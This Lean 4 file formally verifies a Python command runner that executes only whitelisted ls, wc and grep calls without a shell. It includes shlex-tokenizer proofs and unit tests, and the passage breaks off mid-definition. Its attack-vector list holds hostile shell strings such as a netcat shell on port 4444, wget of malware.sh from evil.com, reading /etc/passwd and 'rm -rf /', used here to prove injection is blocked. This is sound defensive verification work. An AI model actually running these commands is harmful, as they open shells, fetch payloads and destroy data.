import Mathlib
namespace Agent

/-!
# Safe prespecified command execution (no command injection)

Lean 4 formalization of the Python module `1_no_command_injection_safe.py`
(`execute_command_safe(cmd_name, args)`).

The Python function

1. validates `cmd_name` against a whitelist
   (`"list" ↦ ["ls", "--"]`, `"count" ↦ ["wc", "-l", "--"]`, `"search" ↦ ["grep", "-r", "--"]`)
   and returns `"Error: Unknown command"` otherwise;
2. if `args.strip()` is non-empty, tokenises `args` with `shlex.split` (POSIX quoting
   rules; shell metacharacters such as `;`, `|`, `&`, `$()` are **not** interpreted and
   stay literal tokens), returning `"Error: Invalid arguments - <msg>"` on malformed
   quoting;
3. runs exactly one program with `subprocess.run(argv, shell=False, check=True)` and
   returns its standard output, or `"Error: <stderr.strip() or 'Command failed'>"` on a
   non-zero exit status, or `"Error: Command not found"` if the program does not exist.

Modelling choices:

* `shlexSplit` re-implements the POSIX state machine of `shlex.split`
  (outside quotes / inside `'…'` / inside `"…"` / after a backslash outside quotes /
  after a backslash inside `"…"`), including its two error messages
  `No closing quotation` and `No escaped character`.
* The operating system is modelled by an *executor* `Executor := List String → ExecResult`
  describing what `execve` of a given argv array produces.  `executeCommandSafe` is
  parametrised by the executor, so every theorem quantifies over all possible OS
  behaviours.  A real executor built on `IO.Process.output` (which calls `execve`
  directly, never a shell) is provided as `executeCommandSafeIO`.
* The central security statements are `exec_only_whitelisted_thm` / `single_program_thm`
  (the result depends only on how the executor behaves on argv arrays extending a
  whitelisted base command, i.e. only `ls`, `wc` or `grep` can ever run),
  `argv_structure_thm` (the argv handed to `execve` is `base ++ userTokens` with `base` a
  whitelisted command ending in the `--` sentinel)
  and `metachar_literal_thm` (an argument string without quotes or backslashes is split
  purely on whitespace, so `"; rm -rf /"` becomes the literal tokens
  `[";", "rm", "-rf", "/"]`).
-/

namespace «1_no_command_injection_safe»

/-! ## Functional implementation -/

/-- Outcome of running exactly one program (one `execve`) with a given argv array. -/
inductive ExecResult where
  /-- exit status `0`: the captured standard output (`completed.stdout`) -/
  | ok (stdout : String)
  /-- non-zero exit status (`subprocess.CalledProcessError`): the captured standard error -/
  | failed (stderr : String)
  /-- the program does not exist (`FileNotFoundError`) -/
  | notFound
  deriving DecidableEq, Repr

/-- A model of the operating system: the behaviour of `execve` on an argv array.
No shell is ever involved, so exactly one program (the head of the argv) runs. -/
abbrev Executor := List String → ExecResult

deriving instance DecidableEq for Except

/-- The secure whitelist (`command_map`); every base argv ends with the `--` sentinel. -/
def commandMap : List (String × List String) :=
  [("list", ["ls", "--"]), ("count", ["wc", "-l", "--"]), ("search", ["grep", "-r", "--"])]

/-- The only programs that can ever be executed. -/
def whitelistedPrograms : List String := ["ls", "wc", "grep"]

/-- Whitelist validation: `command_map[cmd_name]` if `cmd_name in command_map`. -/
def lookupCommand (cmdName : String) : Option (List String) :=
  if cmdName = "list" then some ["ls", "--"]
  else if cmdName = "count" then some ["wc", "-l", "--"]
  else if cmdName = "search" then some ["grep", "-r", "--"]
  else none

/-- Python `str.isspace` (the characters removed by `str.strip()`). -/
def pyIsSpace (c : Char) : Bool :=
  c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\x0b' || c == '\x0c' ||
  c == '\x1c' || c == '\x1d' || c == '\x1e' || c == '\x1f' || c == '\x85' || c == '\xa0' ||
  c == '\u1680' || ('\u2000' ≤ c && c ≤ '\u200a') || c == '\u2028' || c == '\u2029' ||
  c == '\u202f' || c == '\u205f' || c == '\u3000'

/-- Python `str.strip()`. -/
def pyStrip (s : String) : String :=
  String.mk ((s.toList.dropWhile pyIsSpace).reverse.dropWhile pyIsSpace).reverse

/-- `not args.strip()`: `args` is empty or consists of whitespace only. -/
def stripIsEmpty (s : String) : Bool := s.toList.all pyIsSpace

/-- `shlex` whitespace (`shlex.whitespace = ' \t\r\n'`). -/
def isWs (c : Char) : Bool := c == ' ' || c == '\t' || c == '\r' || c == '\n'

/-- The only characters `shlex.split` interprets: the two quotes and the escape
character.  Shell metacharacters (`;`, `|`, `&`, `$`, `` ` ``, …) are *not* among them. -/
def isSpecial (c : Char) : Bool := c == '\'' || c == '"' || c == '\\'

/-- States of the POSIX `shlex` tokenizer. -/
inductive LexMode where
  /-- outside quotes (`shlex` states `' '` and `'a'`) -/
  | normal
  /-- inside `'…'` -/
  | single
  /-- inside `"…"` -/
  | double
  /-- just after a backslash outside quotes -/
  | escNormal
  /-- just after a backslash inside `"…"` -/
  | escDouble
  deriving DecidableEq, Repr

/-- The `shlex.split` state machine (POSIX mode, `whitespace_split=True`, no comments).
`inTok` records that a token has been started (so that `''` yields an empty token),
`cur` is the current token (reversed) and `acc` the tokens emitted so far (reversed).
Quotes and backslashes are the *only* characters that are interpreted. -/
def splitAux : List Char → LexMode → Bool → List Char → List String →
    Except String (List String)
  | [], .normal, inTok, cur, acc =>
      .ok (if inTok then (String.mk cur.reverse :: acc).reverse else acc.reverse)
  | [], .single, _, _, _ | [], .double, _, _, _ => .error "No closing quotation"
  | [], .escNormal, _, _, _ | [], .escDouble, _, _, _ => .error "No escaped character"
  | c :: cs, .normal, inTok, cur, acc =>
      if isWs c then
        splitAux cs .normal false [] (if inTok then String.mk cur.reverse :: acc else acc)
      else if c = '\'' then splitAux cs .single true cur acc
      else if c = '"' then splitAux cs .double true cur acc
      else if c = '\\' then splitAux cs .escNormal true cur acc
      else splitAux cs .normal true (c :: cur) acc
  | c :: cs, .single, _, cur, acc =>
      if c = '\'' then splitAux cs .normal true cur acc
      else splitAux cs .single true (c :: cur) acc
  | c :: cs, .double, _, cur, acc =>
      if c = '"' then splitAux cs .normal true cur acc
      else if c = '\\' then splitAux cs .escDouble true cur acc
      else splitAux cs .double true (c :: cur) acc
  | c :: cs, .escNormal, _, cur, acc => splitAux cs .normal true (c :: cur) acc
  | c :: cs, .escDouble, _, cur, acc =>
      if c = '"' ∨ c = '\\' then splitAux cs .double true (c :: cur) acc
      else splitAux cs .double true (c :: '\\' :: cur) acc

/-- `shlex.split(s)`: safe tokenization *without* any shell interpretation. -/
def shlexSplit (s : String) : Except String (List String) :=
  splitAux s.toList .normal false [] []

/-- Naive whitespace splitting (no quoting at all): the reference behaviour of
`shlex.split` on strings that contain neither quotes nor backslashes. -/
def wsSplitAux : List Char → List Char → List String → List String
  | [], cur, acc => (if cur.isEmpty then acc else String.mk cur.reverse :: acc).reverse
  | c :: cs, cur, acc =>
      if isWs c then wsSplitAux cs [] (if cur.isEmpty then acc else String.mk cur.reverse :: acc)
      else wsSplitAux cs (c :: cur) acc

/-- Split a string on `shlex` whitespace, dropping empty pieces. -/
def wsSplit (s : String) : List String := wsSplitAux s.toList [] []

/-- Build the argv array that is handed to `execve`: whitelist validation, then the
user tokens appended *after* the base command (which ends with `--`). -/
def buildArgv (cmdName : String) (args : String) : Except String (List String) :=
  match lookupCommand cmdName with
  | none => .error "Error: Unknown command"
  | some base =>
      if stripIsEmpty args then .ok base
      else
        match shlexSplit args with
        | .error e => .error ("Error: Invalid arguments - " ++ e)
        | .ok userArgs => .ok (base ++ userArgs)

/-- Translate the outcome of the single `execve` into Python's return value. -/
def interpretResult : ExecResult → String
  | .ok stdout => stdout
  | .failed stderr =>
      "Error: " ++ (if stderr.isEmpty then "Command failed" else pyStrip stderr)
  | .notFound => "Error: Command not found"

/-- `execute_command_safe(cmd_name, args="")`, parametrised by the operating-system model. -/
def executeCommandSafe (exec : Executor) (cmdName : String) (args : String := "") : String :=
  match buildArgv cmdName args with
  | .error msg => msg
  | .ok argv => interpretResult (exec argv)

/-- The real operating system: `IO.Process.output` performs one `execve` of `argv`
(no shell), like `subprocess.run(argv, shell=False, capture_output=True)`. -/
def realExecutor (argv : List String) : IO ExecResult := do
  match argv with
  | [] => return .notFound
  | prog :: rest =>
    try
      let out ← IO.Process.output { cmd := prog, args := rest.toArray }
      if out.exitCode = 0 then return .ok out.stdout else return .failed out.stderr
    catch _ => return .notFound

/-- `execute_command_safe` running real programs. -/
def executeCommandSafeIO (cmdName : String) (args : String := "") : IO String := do
  match buildArgv cmdName args with
  | .error msg => return msg
  | .ok argv => return interpretResult (← realExecutor argv)

/-! ## Unit tests -/

/-- A mock operating system for the tests: knows `ls`, `wc -l` and `grep -r` only. -/
def mockExec : Executor := fun argv =>
  match argv with
  | "ls" :: "--" :: files =>
      match files.find? (fun f => !(f == "." || f == "/tmp" || f == "/")) with
      | none => .ok "file1.txt\nfile2.txt\n"
      | some bad => .failed ("ls: cannot access '" ++ bad ++ "': No such file or directory\n")
  | "wc" :: "-l" :: "--" :: [file] => .ok ("3 " ++ file ++ "\n")
  | "grep" :: "-r" :: "--" :: pattern :: dir :: _ =>
      .ok (dir ++ "/test.txt:" ++ pattern ++ " world\n")
  | _ => .notFound

/-- The injection vectors of the Python test-suite. -/
def attackVectors : List String :=
  ["; echo HACKED", "| cat /etc/passwd", "&& uname -a", "$(id)", "`whoami`",
   "; rm -rf /", "| curl evil.com", "; nc -l 4444 -e /bin/bash", "&& wget evil.com/malware.sh",
   "&& echo hacked", "$(malicious_command)", "`evil_command`"]

-- basic list command
example : executeCommandSafe mockExec "list" "." = "file1.txt\nfile2.txt\n" := by native_decide
-- count command on a (temporary) file: "3" occurs in the result
example : executeCommandSafe mockExec "count" "/tmp/tmpab12.txt" = "3 /tmp/tmpab12.txt\n" := by
  native_decide
example : "3".isPrefixOf (executeCommandSafe mockExec "count" "/tmp/tmpab12.txt") = true := by
  native_decide
-- search command
example : executeCommandSafe mockExec "search" "hello /tmp/tmpdir" =
    "/tmp/tmpdir/test.txt:hello world\n" := by native_decide
-- unknown command
example : executeCommandSafe mockExec "unknown" "args" = "Error: Unknown command" := by native_decide
-- empty / blank args: only the base command runs
example : executeCommandSafe mockExec "list" "" = "file1.txt\nfile2.txt\n" := by native_decide
example : buildArgv "list" "   " = .ok ["ls", "--"] := by native_decide
-- quoted argument
example : executeCommandSafe mockExec "list" "\"/tmp\"" = "file1.txt\nfile2.txt\n" := by native_decide
example : buildArgv "list" "\"/tmp\"" = .ok ["ls", "--", "/tmp"] := by native_decide
-- the attack `"; rm -rf /"` only makes `ls` look for weird file names
example : buildArgv "list" "; rm -rf /" = .ok ["ls", "--", ";", "rm", "-rf", "/"] := by native_decide
example : executeCommandSafe mockExec "list" "; rm -rf /" =
    "Error: ls: cannot access ';': No such file or directory" := by native_decide
-- injection in the command name is rejected
example : executeCommandSafe mockExec "; rm -rf /" "." = "Error: Unknown command" := by native_decide
-- `shlex.split` behaviour
example : shlexSplit "file.txt ; rm -rf /" = .ok ["file.txt", ";", "rm", "-rf", "/"] := by native_decide
example : shlexSplit "$(id)" = .ok ["$(id)"] := by native_decide
example : shlexSplit "`whoami`" = .ok ["`whoami`"] := by native_decide
example : shlexSplit "a 'b c' d" = .ok ["a", "b c", "d"] := by native_decide
example : shlexSplit "''" = .ok [""] := by native_decide
example : shlexSplit "\"a\\\"b\"" = .ok ["a\"b"] := by native_decide
example : shlexSplit "\"a\\nb\"" = .ok ["a\\nb"] := by native_decide
example : shlexSplit "a\\ b" = .ok ["a b"] := by native_decide
example : shlexSplit "  a\t b  " = .ok ["a", "b"] := by native_decide
example : shlexSplit "" = .ok [] := by native_decide
example : shlexSplit "'abc" = .error "No closing quotation" := by native_decide
example : shlexSplit "abc\\" = .error "No escaped character" := by native_decide
example : executeCommandSafe mockExec "list" "'abc" =
    "Error: Invalid arguments - No closing quotation" := by native_decide
example : wsSplit "file.txt ; rm -rf /" = ["file.txt", ";", "rm", "-rf", "/"] := by native_decide
-- executor failures
example : interpretResult (.failed "") = "Error: Command failed" := by native_decide
example : interpretResult (.failed "boom\n") = "Error: boom" := by native_decide
example : interpretResult .notFound = "Error: Command not found" := by native_decide
example : pyStrip "  \t x y \n" = "x y" := by native_decide
-- all attack vectors are contained: literal tokens after `--`, never a program
example : (attackVectors.all fun a =>
    buildArgv "list" a == .ok (["ls", "--"] ++ wsSplit a) &&
    executeCommandSafe mockExec a "." == "Error: Unknown command") = true := by native_decide

#eval executeCommandSafe mockExec "list" "."
#eval shlexSplit "file.txt ; rm -rf /"
#eval buildArgv "list" "; rm -rf /"
#eval executeCommandSafe mockExec "list" "; rm -rf /"
#eval attackVectors.map (fun a => buildArgv "list" a)
-- real execution (one `execve`, no shell): `ls --` on the current directory
#eval executeCommandSafeIO "list" "."
#eval executeCommandSafeIO "evil" "args"
#eval executeCommandSafeIO "list" "; echo HACKED"

/-! ## Helper lemmas -/

theorem lookupCommand_mem {cmdName : String} {base : List String}
    (h : lookupCommand cmdName = some base) : (cmdName, base) ∈ commandMap := by
  unfold lookupCommand at h
  split_ifs at h <;> simp_all [commandMap]

theorem lookupCommand_eq_none_iff (cmdName : String) :
    lookupCommand cmdName = none ↔ ∀ base, (cmdName, base) ∉ commandMap := by
  constructor
  · intro h base hmem
    simp only [commandMap, List.mem_cons, List.not_mem_nil, or_false, Prod.mk.injEq] at hmem
    rcases hmem with ⟨rfl, rfl⟩ | ⟨rfl, rfl⟩ | ⟨rfl, rfl⟩ <;> simp [lookupCommand] at h
  · intro h
    unfold lookupCommand
    split_ifs with h1 h2 h3
    · exact absurd (by subst h1; simp [commandMap]) (h ["ls", "--"])
    · exact absurd (by subst h2; simp [commandMap]) (h ["wc", "-l", "--"])
    · exact absurd (by subst h3; simp [commandMap]) (h ["grep", "-r", "--"])
    · rfl

/-- Every whitelisted base command starts with a whitelisted program and ends with `--`. -/
theorem lookupCommand_spec {cmdName : String} {base : List String}
    (h : lookupCommand cmdName = some base) :
    (∃ prog ∈ whitelistedPrograms, base.head? = some prog) ∧ base.getLast? = some "--" := by
  unfold lookupCommand at h
  split_ifs at h <;> simp at h <;> subst h
  · exact ⟨⟨"ls", by simp [whitelistedPrograms], rfl⟩, rfl⟩
  · exact ⟨⟨"wc", by simp [whitelistedPrograms], rfl⟩, rfl⟩
  · exact ⟨⟨"grep", by simp [whitelistedPrograms], rfl⟩, rfl⟩

/-- The tokenizer only ever fails with one of `shlex`'s two error messages. -/
theorem splitAux_error {cs : List Char} {mode : LexMode} {inTok : Bool} {cur : List Char}
    {acc : List String} {e : String} (h : splitAux cs mode inTok cur acc = .error e) :
    e = "No closing quotation" ∨ e = "No escaped character" := by
  induction cs generalizing mode inTok cur acc with
  | nil =>
    cases mode <;> simp only [splitAux, Except.error.injEq, reduceCtorEq] at h <;> subst h <;> simp
  | cons c cs ih =>
    cases mode <;> simp only [splitAux] at h <;> (try split_ifs at h) <;> exact ih h

theorem shlexSplit_error {s e : String} (h : shlexSplit s = .error e) :
    e = "No closing quotation" ∨ e = "No escaped character" := by
  unfold shlexSplit at h
  exact splitAux_error h

/-- Without quotes and backslashes the tokenizer is plain whitespace splitting. -/
theorem splitAux_plain {cs : List Char} (hcs : ∀ c ∈ cs, isSpecial c = false)
    (cur : List Char) (acc : List String) :
    splitAux cs .normal (!cur.isEmpty) cur acc = .ok (wsSplitAux cs cur acc) := by
  induction cs generalizing cur acc with
  | nil => cases cur <;> simp [splitAux, wsSplitAux]
  | cons c cs ih =>
    have hc : isSpecial c = false := hcs c (List.mem_cons_self ..)
    have hcs' : ∀ d ∈ cs, isSpecial d = false := fun d hd => hcs d (List.mem_cons_of_mem c hd)
    have h1 : ¬ c = '\'' := fun h => by subst h; simp [isSpecial] at hc
    have h2 : ¬ c = '"' := fun h => by subst h; simp [isSpecial] at hc
    have h3 : ¬ c = '\\' := fun h => by subst h; simp [isSpecial] at hc
    by_cases hw : isWs c = true
    · have := ih hcs' [] (if cur.isEmpty then acc else String.mk cur.reverse :: acc)
      simp only [splitAux, wsSplitAux, if_pos hw]
      cases cur <;> simpa using this
    · simp only [splitAux, wsSplitAux, if_neg hw, if_neg h1, if_neg h2, if_neg h3]
      exact ih hcs' (c :: cur) acc

theorem shlexSplit_plain {s : String} (hs : ∀ c ∈ s.toList, isSpecial c = false) :
    shlexSplit s = .ok (wsSplit s) :=
  splitAux_plain hs [] []

/-- Structure of a successfully built argv: whitelisted base, then the user tokens. -/
theorem buildArgv_ok {cmdName args : String} {argv : List String}
    (h : buildArgv cmdName args = .ok argv) :
    ∃ base user, lookupCommand cmdName = some base ∧ argv = base ++ user ∧
      (stripIsEmpty args = true → user = []) ∧
      (stripIsEmpty args = false → shlexSplit args = .ok user) := by
  unfold buildArgv at h
  cases hl : lookupCommand cmdName with
  | none => simp [hl] at h
  | some base =>
    simp only [hl] at h
    by_cases hs : stripIsEmpty args = true
    · rw [if_pos hs] at h
      simp only [Except.ok.injEq] at h
      exact ⟨base, [], rfl, by simp [h], fun _ => rfl, fun h' => by simp [hs] at h'⟩
    · rw [if_neg hs] at h
      cases ht : shlexSplit args with
      | error e => simp [ht] at h
      | ok user =>
        rw [ht] at h
        simp only [Except.ok.injEq] at h
        exact ⟨base, user, rfl, h.symm, fun h' => absurd h' hs, fun _ => rfl⟩

/-- The only error strings `buildArgv` can produce. -/
theorem buildArgv_error {cmdName args e : String} (h : buildArgv cmdName args = .error e) :
    e = "Error: Unknown command" ∨
    e = "Error: Invalid arguments - No closing quotation" ∨
    e = "Error: Invalid arguments - No escaped character" := by
  unfold buildArgv at h
  cases hl : lookupCommand cmdName with
  | none =>
    simp only [hl] at h
    simp only [Except.error.injEq] at h
    exact Or.inl h.symm
  | some base =>
    simp only [hl] at h
    by_cases hs : stripIsEmpty args = true
    · rw [if_pos hs] at h
      exact absurd h (by simp)
    · rw [if_neg hs] at h
      cases ht : shlexSplit args with
      | ok user =>
        rw [ht] at h
        exact absurd h (by simp)
      | error e' =>
        rw [ht] at h
        simp only [Except.error.injEq] at h
        subst h
        rcases shlexSplit_error ht with rfl | rfl
        · exact Or.inr (Or.inl rfl)
        · exact Or.inr (Or.inr rfl)

/-- An argv array is *whitelisted* if it extends one of the whitelisted base commands
(so that its program is `ls`, `wc` or `grep` and all later entries follow `--`). -/
def WhitelistedArgv (argv : List String) : Prop := ∃ p ∈ commandMap, p.2 <+: argv

/-- The executor is only ever invoked on a whitelisted argv: two operating systems that
agree on whitelisted argv arrays give the same result. -/
theorem exec_only_whitelisted (exec exec' : Executor) (cmdName args : String)
    (h : ∀ argv, WhitelistedArgv argv → exec argv = exec' argv) :
    executeCommandSafe exec cmdName args = executeCommandSafe exec' cmdName args := by
  unfold executeCommandSafe
  cases hb : buildArgv cmdName args with
  | error e => rfl
  | ok argv =>
    obtain ⟨base, user, hl, rfl, -, -⟩ := buildArgv_ok hb
    show interpretResult (exec (base ++ user)) = interpretResult (exec' (base ++ user))
    rw [h (base ++ user) ⟨(cmdName, base), lookupCommand_mem hl, user, rfl⟩]

/-- The program (head of the argv) of every whitelisted argv is `ls`, `wc` or `grep`. -/
theorem WhitelistedArgv.head_mem {argv : List String} (h : WhitelistedArgv argv) :
    ∃ prog ∈ whitelistedPrograms, argv.head? = some prog := by
  obtain ⟨p, hp, t, rfl⟩ := h
  simp only [commandMap, List.mem_cons, List.not_mem_nil, or_false] at hp
  rcases hp with rfl | rfl | rfl
  · exact ⟨"ls", by simp [whitelistedPrograms], rfl⟩
  · exact ⟨"wc", by simp [whitelistedPrograms], rfl⟩
  · exact ⟨"grep", by simp [whitelistedPrograms], rfl⟩

/-! ## Pre-condition -/

/-- `execute_command_safe` accepts *any* two strings (hostile, malformed or empty input is
handled by returning an error string), so there is no precondition. -/
def Pre (_cmdName _args : String) : Prop := True

/-! ## Property propositions and theorems -/

/-- Whitelist validation: a command name that is not in `command_map` is rejected. -/
def unknown_command_prop (cmdName _args result : String) : Prop :=
  (∀ base, (cmdName, base) ∉ commandMap) → result = "Error: Unknown command"

theorem unknown_command_thm (exec : Executor) (cmdName args : String) :
    unknown_command_prop cmdName args (executeCommandSafe exec cmdName args) := by
  intro h
  have hl : lookupCommand cmdName = none := (lookupCommand_eq_none_iff cmdName).2 h
  simp [executeCommandSafe, buildArgv, hl]

/-- Malformed quoting in a non-blank argument string yields `Error: Invalid arguments - ...`
(the `ValueError` branch). -/
def invalid_args_prop (cmdName args result : String) : Prop :=
  ∀ base e, lookupCommand cmdName = some base → stripIsEmpty args = false →
    shlexSplit args = .error e → result = "Error: Invalid arguments - " ++ e

theorem invalid_args_thm (exec : Executor) (cmdName args : String) :
    invalid_args_prop cmdName args (executeCommandSafe exec cmdName args) := by
  intro base e hl hs he
  simp [executeCommandSafe, buildArgv, hl, hs, he]

/-- Blank arguments: exactly the base command is executed. -/
def empty_args_prop (exec : Executor) (cmdName args result : String) : Prop :=
  ∀ base, lookupCommand cmdName = some base → stripIsEmpty args = true →
    result = interpretResult (exec base)

theorem empty_args_thm (exec : Executor) (cmdName args : String) :
    empty_args_prop exec cmdName args (executeCommandSafe exec cmdName args) := by
  intro base hl hs
  simp [executeCommandSafe, buildArgv, hl, hs]

/-- A successful run returns the program's standard output verbatim. -/
def exec_success_prop (exec : Executor) (cmdName args result : String) : Prop :=
  ∀ argv stdout, buildArgv cmdName args = .ok argv → exec argv = .ok stdout → result = stdout

theorem exec_success_thm (exec : Executor) (cmdName args : String) :
    exec_success_prop exec cmdName args (executeCommandSafe exec cmdName args) := by
  intro argv stdout hb he
  simp [executeCommandSafe, hb, he, interpretResult]

/-- A failing run is reported as `Error: <stderr.strip() or 'Command failed'>`, a missing
program as `Error: Command not found`. -/
def exec_failure_prop (exec : Executor) (cmdName args result : String) : Prop :=
  ∀ argv, buildArgv cmdName args = .ok argv →
    (∀ stderr, exec argv = .failed stderr →
      result = "Error: " ++ (if stderr.isEmpty then "Command failed" else pyStrip stderr)) ∧
    (exec argv = .notFound → result = "Error: Command not found")

theorem exec_failure_thm (exec : Executor) (cmdName args : String) :
    exec_failure_prop exec cmdName args (executeCommandSafe exec cmdName args) := by
  intro argv hb
  refine ⟨fun stderr he => ?_, fun he => ?_⟩ <;>
    simp [executeCommandSafe, hb, he, interpretResult]

/-- The argv handed to `execve` is a whitelisted base command (program `ls`/`wc`/`grep`,
ending with the `--` sentinel) followed by the `shlex` tokens of the user string. -/
def argv_structure_prop (cmdName args : String) : Prop :=
  ∀ argv, buildArgv cmdName args = .ok argv →
    ∃ base user, lookupCommand cmdName = some base ∧ (cmdName, base) ∈ commandMap ∧
      (∃ prog ∈ whitelistedPrograms, base.head? = some prog) ∧ base.getLast? = some "--" ∧
      argv = base ++ user ∧
      (stripIsEmpty args = true → user = []) ∧
      (stripIsEmpty args = false → shlexSplit args = .ok user)

theorem argv_structure_thm (cmdName args : String) : argv_structure_prop cmdName args := by
  intro argv hb
  obtain ⟨base, user, hl, hargv, h1, h2⟩ := buildArgv_ok hb
  obtain ⟨hprog, hlast⟩ := lookupCommand_spec hl
  exact ⟨base, user, hl, lookupCommand_mem hl, hprog, hlast, hargv, h1, h2⟩

/-- No command injection: the result depends only on what the OS does for whitelisted
argv arrays, i.e. no program other than a whitelisted one is ever executed. -/
def exec_only_whitelisted_prop (exec : Executor) (cmdName args result : String) : Prop :=
  ∀ exec' : Executor, (∀ argv, WhitelistedArgv argv → exec argv = exec' argv) →
    result = executeCommandSafe exec' cmdName args

theorem exec_only_whitelisted_thm (exec : Executor) (cmdName args : String) :
    exec_only_whitelisted_prop exec cmdName args (executeCommandSafe exec cmdName args) :=
  fun exec' h => exec_only_whitelisted exec exec' cmdName args h

/-- Exactly one of the programs `ls`, `wc`, `grep` is ever executed: the result depends only
on what the OS does for argv arrays whose program is a whitelisted one (so `rm`, `sh`, ...
can never run, whatever the user input). -/
def single_program_prop (exec : Executor) (cmdName args result : String) : Prop :=
  ∀ exec' : Executor,
    (∀ argv prog, argv.head? = some prog → prog ∈ whitelistedPrograms → exec argv = exec' argv) →
    result = executeCommandSafe exec' cmdName args

theorem single_program_thm (exec : Executor) (cmdName args : String) :
    single_program_prop exec cmdName args (executeCommandSafe exec cmdName args) := by
  intro exec' h
  apply exec_only_whitelisted
  intro argv hw
  obtain ⟨prog, hprog, hhead⟩ := WhitelistedArgv.head_mem hw
  exact h argv prog hhead hprog

/-- The return value is either the stdout of the single program run, or an `Error: ...`. -/
def error_or_stdout_prop (exec : Executor) (cmdName args result : String) : Prop :=
  (∃ argv, buildArgv cmdName args = .ok argv ∧ exec argv = .ok result) ∨
  ∃ rest, result = "Error: " ++ rest

theorem error_or_stdout_thm (exec : Executor) (cmdName args : String) :
    error_or_stdout_prop exec cmdName args (executeCommandSafe exec cmdName args) := by
  unfold error_or_stdout_prop
  obtain ⟨e, hb⟩ | ⟨argv, hb⟩ :
      (∃ e, buildArgv cmdName args = .error e) ∨ (∃ argv, buildArgv cmdName args = .ok argv) := by
    cases buildArgv cmdName args <;> simp
  · have hr : executeCommandSafe exec cmdName args = e := by simp [executeCommandSafe, hb]
    rw [hr]
    right
    rcases buildArgv_error hb with rfl | rfl | rfl
    · exact ⟨"Unknown command", rfl⟩
    · exact ⟨"Invalid arguments - No closing quotation", rfl⟩
    · exact ⟨"Invalid arguments - No escaped character", rfl⟩
  · have hr : executeCommandSafe exec cmdName args = interpretResult (exec argv) := by
      simp [executeCommandSafe, hb]
    rw [hr]
    cases he : exec argv with
    | ok stdout => exact Or.inl ⟨argv, hb, by simp [interpretResult, he]⟩
    | failed stderr =>
      exact Or.inr ⟨if stderr.isEmpty then "Command failed" else pyStrip stderr, rfl⟩
    | notFound => exact Or.inr ⟨"Command not found", rfl⟩

/-- Shell metacharacters are inert: without quotes/backslashes, `shlex.split` is plain
whitespace splitting, so `"; rm -rf /"` becomes the literal tokens `[";","rm","-rf","/"]`. -/
def metachar_literal_prop (args : String) : Prop :=
  (∀ c ∈ args.toList, isSpecial c = false) → shlexSplit args = .ok (wsSplit args)

theorem metachar_literal_thm (args : String) : metachar_literal_prop args :=
  fun h => shlexSplit_plain h

/-- `shlex.split` fails only with `No closing quotation` or `No escaped character`. -/
def shlex_error_prop (args : String) : Prop :=
  ∀ e, shlexSplit args = .error e → e = "No closing quotation" ∨ e = "No escaped character"

theorem shlex_error_thm (args : String) : shlex_error_prop args :=
  fun _ h => shlexSplit_error h

/-! ## Post-condition -/

/-- Full specification of `execute_command_safe(cmd_name, args)` returning `result` under
the operating-system model `exec`. -/
def Post_prop (exec : Executor) (cmdName args result : String) : Prop :=
  unknown_command_prop cmdName args result ∧
  invalid_args_prop cmdName args result ∧
  empty_args_prop exec cmdName args result ∧
  exec_success_prop exec cmdName args result ∧
  exec_failure_prop exec cmdName args result ∧
  argv_structure_prop cmdName args ∧
  exec_only_whitelisted_prop exec cmdName args result ∧
  single_program_prop exec cmdName args result ∧
  error_or_stdout_prop exec cmdName args result ∧
  metachar_literal_prop args ∧
  shlex_error_prop args

/-! ## Property-based tests

Executable Boolean forms of every property above, checked on random strings
(`Plausible`) and exhaustively on the injection vectors of the Python test-suite. -/

/-- Executable form of `unknown_command_prop`. -/
def unknownCommandCheck (exec : Executor) (cmdName args : String) : Bool :=
  commandMap.any (fun p => p.1 == cmdName) ||
    executeCommandSafe exec cmdName args == "Error: Unknown command"

/-- Executable form of `invalid_args_prop`. -/
def invalidArgsCheck (exec : Executor) (cmdName args : String) : Bool :=
  match lookupCommand cmdName, stripIsEmpty args, shlexSplit args with
  | some _, false, .error e =>
      executeCommandSafe exec cmdName args == "Error: Invalid arguments - " ++ e
  | _, _, _ => true

/-- Executable form of `empty_args_prop`. -/
def emptyArgsCheck (exec : Executor) (cmdName args : String) : Bool :=
  match lookupCommand cmdName, stripIsEmpty args with
  | some base, true => executeCommandSafe exec cmdName args == interpretResult (exec base)
  | _, _ => true

/-- Executable form of `exec_success_prop` and `exec_failure_prop`. -/
def execResultCheck (exec : Executor) (cmdName args : String) : Bool :=
  match buildArgv cmdName args with
  | .error _ => true
  | .ok argv =>
      let r := executeCommandSafe exec cmdName args
      match exec argv with
      | .ok stdout => r == stdout
      | .failed stderr =>
          r == "Error: " ++ (if stderr.isEmpty then "Command failed" else pyStrip stderr)
      | .notFound => r == "Error: Command not found"

/-- Executable form of `argv_structure_prop`. -/
def argvStructureCheck (cmdName args : String) : Bool :=
  match buildArgv cmdName args, lookupCommand cmdName with
  | .error _, _ => true
  | .ok _, none => false
  | .ok argv, some base =>
      argv.take base.length == base && commandMap.contains (cmdName, base) &&
      base.head?.any whitelistedPrograms.contains && base.getLast? == some "--" &&
      (if stripIsEmpty args then argv == base
       else shlexSplit args == .ok (argv.drop base.length))

/-- Executable form of `WhitelistedArgv`. -/
def isWhitelistedArgv (argv : List String) : Bool :=
  commandMap.any (fun p => p.2.isPrefixOf argv)

/-- An operating system that refuses everything outside the whitelist. -/
def restrictToWhitelist (exec : Executor) : Executor := fun argv =>
  if isWhitelistedArgv argv then exec argv else .notFound

/-- Executable form of `exec_only_whitelisted_prop` (against the restricted OS). -/
def execOnlyWhitelistedCheck (exec : Executor) (cmdName args : String) : Bool :=
  executeCommandSafe exec cmdName args ==
    executeCommandSafe (restrictToWhitelist exec) cmdName args

/-- An operating system on which only `ls`, `wc` and `grep` exist. -/
def restrictToPrograms (exec : Executor) : Executor := fun argv =>
  match argv.head? with
  | some prog => if whitelistedPrograms.contains prog then exec argv else .notFound
  | none => .notFound

/-- Executable form of `single_program_prop` (against the restricted OS). -/
def singleProgramCheck (exec : Executor) (cmdName args : String) : Bool :=
  executeCommandSafe exec cmdName args ==
    executeCommandSafe (restrictToPrograms exec) cmdName args

/-- Executable form of `error_or_stdout_prop`. -/
def errorOrStdoutCheck (exec : Executor) (cmdName args : String) : Bool :=
  let r := executeCommandSafe exec cmdName args
  r.startsWith "Error: " ||
    (match buildArgv cmdName args with
     | .ok argv => exec argv == .ok r
     | .error _ => false)

/-- Executable form of `metachar_literal_prop`. -/
def metacharLiteralCheck (args : String) : Bool :=
  !(args.toList.all (fun c => !isSpecial c)) || shlexSplit args == .ok (wsSplit args)

/-- Executable form of `shlex_error_prop`. -/
def shlexErrorCheck (args : String) : Bool :=
  match shlexSplit args with
